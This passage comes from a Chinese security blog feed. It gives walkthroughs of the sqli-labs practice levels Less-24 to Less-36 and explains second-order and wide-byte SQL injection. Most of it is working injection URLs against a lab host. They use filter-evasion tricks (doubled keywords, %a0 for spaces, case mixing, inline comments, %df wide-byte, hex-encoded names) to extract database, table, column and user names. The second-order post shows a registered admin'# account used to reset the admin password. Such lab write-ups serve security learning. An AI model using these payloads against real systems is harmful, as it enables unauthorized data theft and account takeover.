class="headerlink" title="Less-24"></a>Less-24</h3><blockquote><p>见二次注入</p></blockquote><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><blockquote><p>过滤or and 可使用双写绕过 </p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-25</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,exp(~(select * from (select database())x)) --+</span><br><span class="hljs-string">http://192.168.100.107:8080/Less-25/?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat((<span class="hljs-keyword">select</span> database())) <span class="hljs-comment">--+</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-25</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,concat((select table_name from infOorRmation_schema.tables where table_schema=database() limit 0,1)) --+</span><br><span class="hljs-string">http://192.168.100.107:8080/Less-25/?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> infOorRmation_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-comment">--+</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-25</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,concat((select username from users limit 0,1)) --+</span><br></code></pre></td></tr></table></figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>过滤or 和 and</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-25</span>a<span class="hljs-operator">/</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat((<span class="hljs-keyword">select</span> database()))<span class="hljs-comment">--+</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-25</span>a<span class="hljs-operator">/</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat((<span class="hljs-keyword">select</span>(table_name)<span class="hljs-keyword">from</span>(infoorrmation_schema.tables)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-operator">=</span>database()<span class="hljs-operator">%</span>a0limit<span class="hljs-operator">%</span>a00,<span class="hljs-number">1</span>))<span class="hljs-comment">--+</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-25</span>a<span class="hljs-operator">/</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat((<span class="hljs-keyword">select</span>(column_name)<span class="hljs-keyword">from</span>(infoorrmation_schema.columns)<span class="hljs-keyword">where</span>(table_name)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-operator">%</span>a0limit<span class="hljs-operator">%</span>a00,<span class="hljs-number">1</span>))<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-25</span>a<span class="hljs-operator">/</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat((<span class="hljs-keyword">select</span>(username)<span class="hljs-keyword">from</span>(users)<span class="hljs-operator">%</span>a0limit<span class="hljs-operator">%</span>a00,<span class="hljs-number">1</span>))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><blockquote><p>这一关结合了前两关的过滤方法 而且还过滤了空格</p><p>闭合方式不一样 正则表达式过滤了常见的# –+ 不能注释 过滤or and 可使用双写绕过 </p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-26</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1231434</span><span class="hljs-string">&#x27;%a0union%a0select%a01,database(),3&#x27;</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-26</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1231434</span><span class="hljs-string">&#x27;%a0union%a0select%a01,concat((select(table_name)from(infoorrmation_schema.tables)where(table_schema)=database()%a0limit%a00,1)),3&#x27;</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-26</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1231434</span><span class="hljs-string">&#x27;%a0union%a0select%a01,concat((select(column_name)from(infoorrmation_schema.columns)where(table_name)=&#x27;</span>users<span class="hljs-string">&#x27;%a0limit%a00,1)),3&#x27;</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-26</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1231434</span><span class="hljs-string">&#x27;%a0union%a0select%a01,concat((select(username)from(users)%a0limit%a00,1)),3&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><blockquote><p>过滤了空格和注释字符</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-26</span>a<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%a0union%a0select%a01,concat((select%a0database())),3%a0||(&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-26</span>a<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%a0union%a0select%a01,concat((select(table_name)from(infoorrmation_schema.tables)where(table_schema)=database()%a0limit%a00,1)),3%a0||(&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-26</span>a<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%a0union%a0select%a01,concat((select(column_name)from(infoorrmation_schema.columns)where(table_name)=&#x27;</span>users<span class="hljs-string">&#x27;%a0limit%a00,1)),3%a0||(&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-26</span>a<span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;)%a0union%a0select%a01,concat((select(username)from%a0users%a0limit%a00,1)),3%a0||(&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><blockquote><p>过滤了空格和注释字符 union和select 可以使用大小写绕过 内联注释构造空格</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-27</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;/*%a0*/UNIon/*%a0*/sELEct/*%a0*/1,database(),3&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-27</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;/*%a0*/UNIon/*%a0*/sELEct/*%a0*/1,concat((SElECt(table_name)from(information_schema.tables)where(table_schema)=database()/*%a0*/limit/*%a0*/0,1)),3&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-27</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;/*%a0*/UNIon/*%a0*/sELEct/*%a0*/1,concat((SElECt(column_name)from(information_schema.columns)where(table_name)=&#x27;</span>users<span class="hljs-string">&#x27;/*%a0*/limit/*%a0*/0,1)),3&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-27</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;/*%a0*/UNIon/*%a0*/sELEct/*%a0*/1,concat((SElECt(username)from(users)/*%a0*/limit/*%a0*/0,1)),3&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-27</span>a?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;/*%a0*/UNIOn/*%a0*/seLECT/*%a0*/1,2,database()&quot;<br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-27</span>a?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;/*%a0*/UNIOn/*%a0*/seLECT/*%a0*/1,2,concat((seLEct(table_name)from(information_schema.tables)where(table_schema)=database()/*%a0*/limit/*%a0*/0,1))&quot;<br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-27</span>a?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;/*%a0*/UNIOn/*%a0*/seLECT/*%a0*/1,2,concat((seLEct(column_name)from(information_schema.columns)where(table_name)=&#x27;users&#x27;/*%a0*/limit/*%a0*/0,1))&quot;<br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-27</span>a?id<span class="hljs-operator">=</span><span class="hljs-number">0</span>&quot;/*%a0*/UNIOn/*%a0*/seLECT/*%a0*/1,2,concat((seLEct(username)from(users)/*%a0*/limit/*%a0*/0,1))&quot;<br></code></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><blockquote><p>1和1”正常回显，1’报错，单引号字符型。<br>2’||’1’&#x3D;’1回显为id&#x3D;1，有小括号。因为当你有小括号的时候<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code>变成<br><code>$sql=&quot;SELECT * FROM users WHERE id=(&#39;2&#39;||&#39;1&#39;=&#39;1&#39;) LIMIT 0,1&quot;;</code><br>所以会变成id&#x3D;1</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-28</span>?id<span class="hljs-operator">=</span><span class="hljs-number">234345</span><span class="hljs-string">&#x27;)%a0union%a0select(1),(database()),3||(&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-28</span>?id<span class="hljs-operator">=</span><span class="hljs-number">234345</span><span class="hljs-string">&#x27;)%a0union%a0select(1),(concat((select(table_name)from(information_schema.tables)where(table_schema)=database()%a0limit%a00,1))),3||(&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-28</span>?id<span class="hljs-operator">=</span><span class="hljs-number">234345</span><span class="hljs-string">&#x27;)%a0union%a0select(1),(concat((select(column_name)from(information_schema.columns)where(table_name)=&#x27;</span>users<span class="hljs-string">&#x27;%a0limit%a00,1))),3||(&#x27;</span><br><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-28</span>?id<span class="hljs-operator">=</span><span class="hljs-number">234345</span><span class="hljs-string">&#x27;)%a0union%a0select(1),(concat((select(username)from(users)%a0limit%a00,1))),3||(&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>宽字节注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-33</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; union select 1,2,concat((select database()))--+</span><br><span class="hljs-string">http://192.168.100.107:8080/Less-33/?id=0%df&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-33</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; union select 1,2,concat((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1))--+</span><br><span class="hljs-string">因为 &#x27;</span> 被过滤的缘故，所以库名使用hex编码，避免使用<span class="hljs-string">&#x27;</span><br><span class="hljs-string">http://192.168.100.107:8080/Less-33/?id=0%df&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,concat((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>post宽字节注入</p><p><img src="https://i.loli.net/2021/03/27/L7i4sm2juBrGoND.png" alt="image-20210327181931747"></p><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-35</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> database())x))<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-35</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x))<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-35</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-number">0x7573657273</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x))<span class="hljs-comment">--+</span><br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.100</span><span class="hljs-number">.107</span>:<span class="hljs-number">8080</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-35</span>?id<span class="hljs-operator">=</span><span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x))<span class="hljs-comment">--+s</span><br></code></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p><code>mysql_real_escape_string()</code>这个函数是 PHP 过滤的常见函数</p><blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">mysql<span class="hljs-constructor">_real_escape_string(<span class="hljs-params">string</span>,<span class="hljs-params">connection</span>)</span><br></code></pre></td></tr></table></figure></blockquote><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">string</td><td>必需，规定要转义的字符串</td></tr><tr><td align="center">connection</td><td>可选，规定MySQL连接。如果未规定，则使用上一个连接</td></tr></tbody></table><p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p><ul><li><code>\x00</code></li><li><code>\n</code></li><li><code>\r</code></li><li><code>\</code></li><li><code>&#39;</code></li><li><code>&quot;</code></li><li><code>\x1a</code></li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回<code>FALSE</code>。</p><p>本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于<code>mysql_query()</code>，可使用本函数来预防数据库攻击。</p><p>但是因 MySQL 我们并没有设置成 GBK，所以<code>mysql_real_escape_string()</code>依旧能够被突破，方法和上述<code>addslashes()</code>是一样的。</p><p>在使用<code>mysql_real_escape_string()</code>时，若想防范这种问题，需要将 MySQL 设置为 GBK：<br> <code>Mysql_set_charset(‘gbk’,’$conn’)</code></p><p>与Less-32相同</p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次注入</title>
    <link href="/2022/03/03/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/03/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><blockquote><p>简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。</p></blockquote><h4 id="二次注入的原理"><a href="#二次注入的原理" class="headerlink" title="二次注入的原理"></a>二次注入的原理</h4><blockquote><p>二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p></blockquote><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p><img src="https://i.loli.net/2021/03/25/Roqfmag1ysUnlSK.png" alt="image-20210325150804428"></p><p>从上图中可以看出管理员的密码为admin， 我们现在来进行修改 先解释下源码中的sql语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs routeros">原SQL语句：<br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-built_in">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;pass&#x27;</span>whereusername= <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span><br><br>修改密码sql语句：<br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-built_in">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;admin&#x27;</span>#&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span><br><br>最后真正执行的sql语句：<br>UPDATE<span class="hljs-built_in"> users </span><span class="hljs-built_in">SET</span> <span class="hljs-attribute">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;admin&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>利用注册的账户admin’#进行登录，再进到修改密码界面，将123456密码改为000000</p></blockquote><p><img src="https://i.loli.net/2021/03/25/ziuyRgtXSOUTbAW.png" alt="image-20210325152051668"></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>宽字节注入</title>
    <link href="/2022/03/03/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/03/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
    
